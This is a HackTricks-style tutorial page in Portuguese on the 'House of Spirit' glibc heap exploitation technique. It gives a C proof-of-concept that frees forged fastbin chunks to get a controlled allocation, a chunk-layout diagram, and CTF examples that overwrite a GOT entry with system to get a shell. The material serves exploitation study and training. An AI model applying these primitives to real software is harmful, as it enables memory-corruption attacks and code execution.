# Casa do Espírito

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

### Código

<details>

<summary>Casa do Espírito</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Objetivo

- Ser capaz de adicionar um endereço no tcache / fast bin para que mais tarde seja possível alocá-lo

### Requisitos

- Este ataque requer que um atacante consiga criar alguns chunks rápidos falsos indicando corretamente o valor do tamanho e, em seguida, conseguir liberar o primeiro chunk falso para que ele entre no bin.

### Ataque

- Criar chunks falsos que contornem as verificações de segurança: você precisará de 2 chunks falsos basicamente indicando nas posições corretas os tamanhos corretos
- De alguma forma, gerenciar para liberar o primeiro chunk falso para que ele entre no fast ou tcache bin e, em seguida, alocá-lo para sobrescrever aquele endereço

**O código de** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **é ótimo para entender o ataque.** Embora este esquema do código resuma bem:
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
> [!NOTE]
> Note que é necessário criar o segundo chunk para contornar algumas verificações de sanidade.

## Exemplos

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: Através de um overflow, é possível mudar um ponteiro para apontar para um endereço GOT a fim de vazar um endereço libc via a ação de leitura do CTF.
- **House of Spirit**: Abusando de um contador que conta o número de "rifles", é possível gerar um tamanho falso do primeiro chunk falso, então abusando de uma "mensagem", é possível falsificar o segundo tamanho de um chunk e, finalmente, abusando de um overflow, é possível mudar um ponteiro que vai ser liberado, de modo que nosso primeiro chunk falso seja liberado. Então, podemos alocá-lo e dentro dele haverá o endereço de onde a "mensagem" está armazenada. Então, é possível fazer com que isso aponte para a entrada `scanf` dentro da tabela GOT, para que possamos sobrescrevê-la com o endereço do sistema.\
Na próxima vez que `scanf` for chamado, podemos enviar a entrada `"/bin/sh"` e obter um shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Buffer de pilha não inicializado.
- **House of Spirit**: Podemos modificar o primeiro índice de um array global de ponteiros de heap. Com uma única modificação de byte, usamos `free` em um chunk falso dentro de um chunk válido, de modo que obtemos uma situação de chunks sobrepostos após alocar novamente. Com isso, um simples ataque de envenenamento de Tcache funciona para obter uma primitiva de escrita arbitrária.

## Referências

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)

{{#include ../../banners/hacktricks-training.md}}
